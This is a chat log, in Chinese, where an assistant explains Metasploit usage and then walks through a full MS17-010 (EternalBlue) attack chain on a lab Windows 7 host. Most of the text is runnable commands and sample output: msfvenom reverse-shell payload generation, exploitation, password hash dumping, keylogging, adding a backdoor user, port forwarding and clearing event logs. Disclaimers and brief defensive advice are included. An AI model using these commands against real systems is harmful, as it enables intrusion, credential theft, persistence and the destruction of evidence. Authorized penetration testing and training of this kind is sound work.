# Metasploit使用指南

## 🧑‍💻 User

metasploit linux命令如何使用？

---
## 🤖 Assistant

# Metasploit Framework 在 Linux 上的使用指南

Metasploit 是渗透测试中最常用的开源框架之一。下面从**安装**到**实战操作**逐步讲解。

## 1. 安装 Metasploit

### Debian / Ubuntu / Kali

```bash
# Kali Linux 通常已预装，直接更新即可
sudo apt update
sudo apt install metasploit-framework

# 或者使用官方安装脚本（通用 Linux）
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall
```

### 依赖说明
Metasploit 依赖 **Ruby** 和 **PostgreSQL**（用于存储扫描结果、凭证、会话等）。安装后需初始化数据库：

```bash
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init        # 初始化数据库
```

## 2. 核心命令

Metasploit 提供两个主要命令行入口：

| 命令 | 用途 |
|------|------|
| `msfconsole` | 交互式主控制台（最常用） |
| `msfvenom` | 生成 Payload（后门、木马等） |
| `msfdb` | 数据库管理 |
| `msfrpcd` | 启动 RPC 服务（供 MSF 远程调用） |

### 启动控制台

```bash
msfconsole
# 静默模式（不显示 banner，加快启动）
msfconsole -q

# 启动时执行命令
msfconsole -x "use exploits/...; show options; exit"

# 加载资源脚本
msfconsole -r script.rc
```

## 3. `msfconsole` 内部常用命令

进入控制台后，命令分为几类：

### 模块操作
```text
search <关键字>          # 搜索模块，如 search vsftpd
use <模块路径>           # 使用模块，如 use exploit/unix/ftp/vsftpd_234_backdoor
show options             # 查看需要配置的参数
show payloads            # 列出可用 payload
show targets             # 列出目标系统/类型
show advanced            # 查看高级选项
info                     # 查看模块详细信息
back                     # 退出当前模块
```

### 参数设置
```text
set RHOSTS 192.168.1.10    # 设置目标地址（可写网段 192.168.1.0/24）
set RPORT 21               # 设置目标端口
set LHOST 192.168.1.5      # 设置本地监听地址
set LPORT 4444             # 设置本地监听端口
set PAYLOAD linux/x64/meterpreter/reverse_tcp
unset <参数>               # 取消某个参数
setg <参数> <值>           # 全局设置（跨模块生效）
```

### 执行与利用
```text
check          # 检查目标是否存在漏洞（部分模块支持）
exploit        # 执行攻击
run            # 等同于 exploit
jobs           # 查看后台任务
```

### 会话管理
```text
sessions -l              # 列出所有已建立的会话
sessions -i <id>         # 进入指定会话
sessions -k <id>         # 结束会话
background               # 将会话放到后台
```

### 数据库相关
```text
workspace                # 查看/切换工作区
hosts                    # 查看已发现主机
services                 # 查看服务
creds                    # 查看抓到的凭证
loot                     # 查看收集到的数据
db_import <文件>         # 导入扫描结果（如 nmap XML）
db_nmap -sV 192.168.1.0/24   # 在 MSF 内直接调用 nmap 并存库
```

## 4. 完整示例：利用 VSFTPD 后门（Metasploitable 靶机）

```text
msfconsole -q
msf6 > search vsftpd 2.3.4
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 192.168.1.10
msf6 exploit(...) > show payloads
msf6 exploit(...) > set PAYLOAD cmd/unix/interact
msf6 exploit(...) > exploit

[*] 192.168.1.10:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.10:21 - Backdoor service has been spawned...
[*] Command shell session 1 opened
```

成功后会直接获得一个 shell 会话。

## 5. `msfvenom` 生成 Payload

`msfvenom` 是 `msfpayload` + `msfencode` 的整合工具，用于生成木马/payload。

```bash
# 列出 payload
msfvenom -l payloads

# 生成 Linux ELF 反弹 shell
msfvenom -p linux/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.5 LPORT=4444 \
         -f elf -o shell.elf

# 生成 Windows exe
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=192.168.1.5 LPORT=4444 \
         -f exe -o backdoor.exe

# 生成 PHP / WAR / ASP 等
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f war -o shell.war
```

生成后需配合 `exploit/multi/handler` 监听：

```text
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 192.168.1.5
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > exploit -j -z     # -j 后台运行，-z 不自动交互
```

## 6. Meterpreter 常用命令

获得 Meterpreter 会话后，可执行：

```text
sysinfo            # 系统信息
getuid             # 当前用户
getsystem          # 尝试提权到 SYSTEM/root
hashdump           # 导出密码哈希
ps                 # 进程列表
migrate <pid>      # 迁移进程（提权/防查杀）
shell              # 进入系统 shell
upload / download  # 上传/下载文件
screenshot         # 截图
keyscan_start      # 键盘记录
portfwd add -l 8080 -p 80 -r 目标内网IP   # 端口转发（内网穿透）
run post/multi/recon/local_exploit_suggester  # 推荐本地提权模块
```

## 7. 常见问题排查

| 问题 | 解决办法 |
|------|---------|
| 启动慢 / 无 banner | 用 `msfconsole -q`，或关闭 DNS 反查 |
| 数据库连接失败 | `sudo msfdb reinit` 或检查 `postgresql` 服务 |
| `msfupdate` 报错 | 用 `apt update && apt install metasploit-framework` |
| 会话马上断开 | 检查防火墙、LHOST 是否可达、payload 架构是否匹配 |

## ⚠️ 合法使用提醒

Metasploit 是**授权渗透测试**工具。**仅在你有明确书面授权的目标**上使用（如自己的靶机、CTF、HackTheBox、OSCP 实验环境）。未经授权攻击他人系统属于违法行为。

---

如果你有具体场景（比如某个 CVE、某类目标、想练习的靶机），可以告诉我，我可以给出针对性的模块和完整命令流程。

---
## 🧑‍💻 User

以MS17_010为案例演示从扫描到利用的教程（在受控环境中进行）

---
## 🤖 Assistant

# MS17-010 (EternalBlue) 完整实战教程

> ⚠️ **免责说明**：本教程仅用于**自己搭建的虚拟机靶场**或**有书面授权的环境**。请在隔离网络（Host-Only / NAT 内部网络）中进行，切勿对公网或他人系统测试。未授权入侵是违法行为。

MS17-010 是 Windows SMBv1 协议（`srv.sys`）的缓冲区溢出漏洞，对应 **EternalBlue（永恒之蓝）**，曾被 WannaCry、NotPetya 等蠕虫大规模利用。

---

## 0. 实验环境准备

| 角色 | 系统 | IP |
|------|------|----|
| 攻击机 | Kali Linux | `192.168.56.10` |
| 靶机 | Windows 7 / Server 2008 R2（未打补丁） | `192.168.56.20` |

**关键前提**：
- 靶机**关闭防火墙**或放行 445 端口。
- 靶机**启用 SMBv1**（Win7 默认启用；Win10 需手动开启）。
- 两台机器网络互通（VirtualBox Host-Only 或 VMware NAT 内网）。

可用靶机镜像：`Metasploitable3`、`VulnHub`、or MSF 官方镜像，或自建 Win7 SP0（不含 KB4012212 补丁）。

验证靶机是否开放 445：

```bash
ping -c 2 192.168.56.20
nc -zv 192.168.56.20 445
```

---

## 1. 阶段一：信息收集与扫描

### 1.1 启动 Metasploit 与数据库

```bash
sudo systemctl start postgresql
sudo msfdb init          # 首次需初始化
msfconsole -q
```

```text
msf6 > workspace -a ms17
msf6 > db_status                 # 确认数据库已连接
```

### 1.2 使用辅助模块扫描漏洞

MSF 内置专用检测模块：`auxiliary/scanner/smb/smb_ms17_010`

```text
msf6 > search ms17-010

Matching Modules
================
   #  Name                                      Rank
   0  auxiliary/scanner/smb/smb_ms17_010        normal
   1  exploit/windows/smb/ms17_010_eternalblue  average
   2  exploit/windows/smb/ms17_010_psexec       normal
```

使用检测模块：

```text
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

msf6 auxiliary(...) > set RHOSTS 192.168.56.20
msf6 auxiliary(...) > set THREADS 10
msf6 auxiliary(...) > run
```

**预期输出**：

```text
[+] 192.168.56.20:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] Scanned 1 of 1 hosts (100% complete)
```

也可以直接对整个网段探测：

```text
msf6 auxiliary(...) > set RHOSTS 192.168.56.0/24
msf6 auxiliary(...) > run
```

### 1.3 （可选）用 nmap 交叉验证

```bash
nmap -p 445 --script smb-vuln-ms17-010 192.168.56.20
```

在 MSF 内直接调用并存库：

```text
msf6 > db_nmap -sV -p 445 --script smb-vuln-ms17-010 192.168.56.20
msf6 > hosts
msf6 > services
```

---

## 2. 阶段二：漏洞利用（获取会话）

### 2.1 选用 EternalBlue 模块

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

**检查默认参数**：

```text
msf6 exploit(...) > show options

Module options:
   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port
   ...
Payload options (windows/x64/meterpreter/reverse_tcp):
   LHOST                           yes       The listen address
   LPORT          4444             yes       The listen port
```

### 2.2 配置参数

```text
msf6 exploit(...) > set RHOSTS 192.168.56.20
msf6 exploit(...) > set LHOST 192.168.56.10     # 必须是攻击机对靶机可达的网卡 IP
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 查看可用的 target 架构
msf6 exploit(...) > show targets
```

> **提示**：默认 payload 是 `windows/x64/meterpreter/reverse_tcp`。如果靶机是 32 位，需改用 `windows/meterpreter/reverse_tcp`。EternalBlue 在 Win7/2008 上通常稳定。

### 2.3 执行攻击

```text
msf6 exploit(...) > check          # 再次确认漏洞存在
msf6 exploit(...) > exploit

[*] Started reverse TCP handler on 192.168.56.10:4444
[*] 192.168.56.20:445 - Connecting to target for exploitation.
[+] 192.168.56.20:445 - Connection established for exploitation.
[+] 192.168.56.20:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.56.20:445 - CORE raw buffer dump ...
[+] 192.168.56.20:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.56.20:445 - =-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.56.20:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.56.20:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.56.20
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.20:49158)

meterpreter >
```

成功！获得 `meterpreter` 会话。

> **注意**：EternalBlue 可能导致靶机**蓝屏（BSOD）**，尤其在 Win7 内核未完全匹配时。建议在靶机上创建快照，崩溃后恢复。

---

## 3. 阶段三：后渗透（Meterpreter 操作）

```text
meterpreter > sysinfo
Computer        : WIN7-TARGET
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM      # EternalBlue 直接 SYSTEM 权限！

meterpreter > getprivs                     # 查看特权
```

### 3.1 提取密码哈希

```text
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User:1001:aad3b435b51404eeaad3b435b51404ee:...:::
```

### 3.2 进程迁移（稳定会话）

```text
meterpreter > ps
meterpreter > migrate <lsass.exe 的 PID>
[*] Migrating from 1234 to 500 ...
[*] Migration completed successfully.
```

### 3.3 其他常用操作

```text
meterpreter > shell                     # 进入 cmd
C:\Windows\system32> whoami
C:\Windows\system32> ipconfig

meterpreter > screenshot                # 截屏
meterpreter > keyscan_start             # 开启键盘记录
meterpreter > keyscan_dump
meterpreter > upload /tmp/tool.exe C:\\Windows\\Temp\\tool.exe
meterpreter > download C:\\Users\\User\\Desktop\\secret.txt
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/windows/gather/enum_logged_on_users
```

### 3.4 权限维持与横向（仅授权环境演示）

```text
# 开启 RDP
meterpreter > run post/windows/manage/enable_rdp

# 添加后门用户
meterpreter > run post/windows/manage/add_user USER=hacker PASS=Password123

# 内网端口转发（穿透）
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.56.30
```

---

## 4. 阶段四：清理与收尾

```text
meterpreter > clearev        # 清除事件日志（授权测试需谨慎，通常保留证据）
meterpreter > background     # 会话转后台
msf6 > sessions -l
msf6 > sessions -i 1
msf6 > sessions -k 1         # 结束会话
```

存储结果：

```text
msf6 > creds                 # 查看抓取的凭证
msf6 > loot                  # 查看收集的数据
msf6 > db_export -f xml /root/ms17_result.xml
```

---

## 5. 完整命令速查（一条龙）

```text
msfconsole -q
workspace -a ms17
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.56.20
run
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.20
set LHOST 192.168.56.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
sysinfo
getuid
hashdump
```

---

## 6. 常见问题排查

| 现象 | 原因与解决 |
|------|-----------|
| `Host is NOT vulnerable` | 靶机已打补丁，或 SMBv1 被禁用，或 445 未开放 |
| `Connection refused / timeout` | 防火墙阻止 445，或 IP/LHOST 配置错误 |
| 攻击导致靶机 BSOD | EternalBlue 不稳定，属正常现象；用快照恢复，或换 `ms17_010_psexec` 模块 |
| 会话秒断 | 杀软拦截、内核版本不匹配、payload 架构错误 |
| 无回连 | LHOST 填错网卡；检查 `ip a` 确认路由可达 |

**备选模块**（当 EternalBlue 崩溃时）：

```text
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > set RHOSTS 192.168.56.20
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit
```

---

## 7. 防御视角（蓝队建议）

- 安装 **MS17-010 补丁**（KB4012212 / KB4012215）。
- 禁用 **SMBv1**：`Set-SmbServerConfiguration -EnableSMB1Protocol $false`。
- 封禁 **445/139 端口**对外访问。
- 部署 EDR / IDS 规则检测 EternalBlue 特征流量。

---

如果你想，我可以进一步：
- 提供 **Metasploitable3 靶机搭建脚本**；
- 演示 **EternalBlue 流量抓包分析（Wireshark）**；
- 或对比 **MS17-010 各模块的成功率与稳定性**。

告诉我你的实验环境细节即可。
